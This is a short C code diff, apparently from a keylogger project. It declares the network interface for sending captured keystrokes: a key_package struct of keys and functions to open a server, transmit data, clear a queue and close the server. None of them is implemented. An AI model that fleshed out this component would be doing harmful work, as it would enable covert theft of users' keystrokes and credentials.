@@ -1,3 +1,4 @@
+#pragma once
 #include <fcntl.h>
 #include <netinet/in.h>
 #include <stdio.h>
@@ -7,13 +8,31 @@
 #include <sys/time.h>
 #include <unistd.h>
 
-void open_server(void) {
-  // IMPLEMENTATION HERE
-}
-void transmit_data(void) {
-  // IMPLEMENTATION HERE
-}
+#include "keylogger.h"
 
-void close_server(void) {
-  // IMPLEMENTATION HERE
-}
+/**
+ * Represents all the data that is sent over the network
+ */
+typedef struct {
+  char** keys;  // an array of strings to be sent over the network
+} key_package;
+
+/**
+ * Documentation here
+ */
+void open_server(void);
+
+/**
+ * Documentation here
+ */
+void transmit_data(void);
+
+/**
+ * Documentation here
+ */
+void clear_data_queue(void);
+
+/**
+ * Documentation here
+ */
+void close_server(void);
